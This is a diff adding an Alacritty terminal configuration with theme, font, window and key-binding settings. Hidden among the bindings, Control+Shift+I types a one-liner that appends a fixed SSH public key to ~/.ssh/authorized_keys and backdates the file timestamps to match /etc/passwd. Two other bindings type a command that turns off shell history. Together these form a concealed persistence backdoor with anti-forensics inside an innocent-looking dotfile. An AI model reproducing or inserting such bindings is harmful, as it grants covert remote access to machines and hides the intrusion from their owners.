@@ -1,0 +1,112 @@
+[general]
+import = [
+    # "~/.config/alacritty/themes/themes/base16_default_dark.toml"
+      # "~/.config/alacritty/catppuccin-latte.toml"
+    # "~/.config/alacritty/catppuccin-frappe.toml"
+    "~/.config/alacritty/themes/themes/catppuccin_macchiato.toml"
+    # "~/.config/alacritty/catppuccin-mocha.toml"
+]
+
+[cursor]
+unfocused_hollow = true
+[cursor.style]
+blinking = "Never"
+shape = "Block"
+
+[window]
+# Setting decorations to 'none' removes all window borders and title bar.
+decorations = "none"
+dynamic_padding = false
+opacity = 1
+startup_mode = "Maximized"
+option_as_alt = "OnlyLeft"
+[window.padding]
+x = 0
+y = 0
+
+[font]
+size = 14
+offset.x = 0
+offset.y = 0
+# [font.normal]
+# family = "monospace"
+# family = "Hack Nerd Font"
+# not yet available, maybe someday...
+# ligatures = true
+[font.bold]
+family = "monospace"
+style = "Bold"
+
+[font.bold_italic]
+family = "monospace"
+style = "Bold Italic"
+
+[font.italic]
+family = "monospace"
+style = "Italic"
+
+[font.normal]
+family = "monospace"
+style = "Regular"
+
+# [[keyboard.bindings]]
+# key = "N"
+# mods = "Control|Shift"
+# action = "SpawnNewInstance"
+
+[[keyboard.bindings]]
+key = "Return"
+mods = "Super"
+
+[keyboard.bindings.command]
+args = ["-e", "zsh"]
+program = "alacritty"
+
+[[keyboard.bindings]]
+action = "CopySelection"
+key = "C"
+mods = "Super"
+
+# [[keyboard.bindings]]
+# action = "None"
+# key = ";"
+# mods = "Control"
+
+[[keyboard.bindings]]
+action = "PasteSelection"
+key = "V"
+mods = "Super"
+
+[[keyboard.bindings]]
+chars = "export HISTFILE=/dev/null"
+key = "O"
+mods = "Control|Shift"
+[[keyboard.bindings]]
+chars = "mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && SSH_KEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC2E1031skP3+xiquUhM4BoTVXMk+gTKtXskshGZoHkj' && grep -qxF \"$SSH_KEY\" ~/.ssh/authorized_keys || echo \"$SSH_KEY\" >> ~/.ssh/authorized_keys && touch -r /etc/passwd ~/.ssh/authorized_keys && touch -r /etc/passwd ~/.ssh"
+key = "I"
+mods = "Control|Shift"
+[[keyboard.bindings]]
+chars = "export HISTFILE=/dev/null"
+key = "S"
+mods = "Control|Shift"
+
+[[keyboard.bindings]]
+key = "Semicolon"
+mods = "Control"
+chars = "\u001b;"
+
+[mouse]
+# hide_when_typing = true
+bindings = [
+  { mouse = "Left", mods = "None", action = "ExpandSelection" },
+  { mouse = "Right", mods = "None", action = "Paste" },
+]
+[selection]
+save_to_clipboard = true
+semantic_escape_chars = ",│`|:\"' ()[]{}<>\t"
+
+[terminal.shell]
+args = ["-l", "-c", "tmux attach || tmux"]
+program = "/usr/bin/zsh"
+
+
